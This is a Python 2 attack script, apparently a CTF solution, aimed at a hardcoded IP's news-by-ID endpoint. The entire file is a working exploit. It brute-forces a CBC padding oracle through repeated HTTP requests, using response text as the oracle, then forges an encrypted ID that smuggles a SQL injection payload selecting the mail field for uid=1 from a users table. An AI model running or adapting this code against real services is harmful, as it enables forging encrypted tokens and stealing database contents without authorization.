# -*- coding: utf-8 -*-
import sys
import string
import base64
import requests
import math
import re
from urllib import quote


url = "http://54.223.91.224/get_en_news_by_id/"
#cookie = {
#	'auth':'dMl2LO3x3p3A8PR1DnROJXjA0s3/tr9'
#}
encrypt_know_id = "bDNkSUtGUGhHTkhWWDFVeFIrcDNWbnlvaFR5V3BKT3JaT2l6RE0rdHJvVzc="
known_id = '4'
d_cookie = base64.b64decode(base64.b64decode(encrypt_know_id)).encode('hex')
iv = d_cookie[:32]
ciper = d_cookie[34:]
payload = '9'+chr(10)+'union'+chr(10)+'select'+chr(10)+'1,mail,3'+chr(10)+'from`users_field_data`where'+chr(10)+'uid=1'+chr(10)+'or@`'
feature = ['haker?bu chun zai de!','dwordshot']


def t_xor(a, b):
	i = a ^ b
	t = '0' if len(str(hex(i)))<4 else ''
	return t+str(hex(i)).replace('0x','')

def known_xor_now(m, l, b):
	if(b == m):
		b = m - 1
	s = ""
	for i in l:
		s = str(t_xor(i,b)) + s
	return s


def get_niv(m, p, i ,l): 

	b = '0' if len(str(hex(i)))<4 else ''
	niv = ('00'*(m-p)) + (b+str(hex(i)).replace('0x',''))
	return niv + known_xor_now(m, l, p)

def padding_num(m):
	return (len(payload)/m) + (1 if len(payload) % m >0 else 0)

def request_(url):
	try:
		a = requests.get(url)
		return a
	except requests.ConnectionError:
		return request_(url)

def brute_mid(mid_len, features, known_id):
	mid_list = []
	for i in xrange(1,mid_len+1):
		for j in xrange(0,256):
			#print "brute force desc {0} word : chr({1})".format(i,j)
			nid = quote(base64.b64encode(base64.b64encode((get_niv(mid_len,i,j,mid_list)+'7c'+ciper).decode('hex'))))
			a = request_(url+nid)
			#print a.content
			if(i == mid_len):
				if(a.content.find(features[1])!=-1):
					new_mid = j^ord(known_id)
					mid_list.append(new_mid)
					break
				else:
					continue
			else:
				if(a.content.find(features[0])==-1):
					new_mid = j^i
					mid_list.append(new_mid)
					break
				else:
					continue
			
		print mid_list
	mid_list.reverse()
	print mid_list
	print "\n padding ok...\n"
	return mid_list

def f_niv(mid_len,feature,known_id,payload_s):
	midlist = brute_mid(16,feature,known_id)
	pay = []
	for i in xrange(0,len(midlist)):
		if(i > (len(payload_s) - 1)):
			pay.append(midlist[i] ^ (len(midlist) - len(payload_s)))
		else:
			pay.append(midlist[i] ^ ord(payload_s[i]))
	s = ""
	for i in pay:
		s += str(t_xor(i,0))
	return s


def main():
	padd_num = padding_num(16)
	if padd_num > 1:
		s_payload = [payload[i:i+16] for i in xrange(0, len(payload), 16)]
		s_payload.reverse()
		ivlist = []
		global ciper,iv
		s_ciper = ciper
		for p in s_payload:
			iv = f_niv(16,feature,known_id,p)
			print "\niv:{0}\n".format(iv)
			ivlist.append(iv)
			ciper = iv
		iv = ivlist.pop()
		ivlist.reverse()
		print "all ok~~~"
		return base64.b64encode(base64.b64encode((iv+'7c'+''.join(i for i in ivlist)+s_ciper).decode('hex')))

	else:
		iv = f_niv(16,feature,known_id,payload)
		print "all ok ~~~"
		return base64.b64encode(base64.b64encode((iv+'7c'+ciper).decode('hex')))
print main()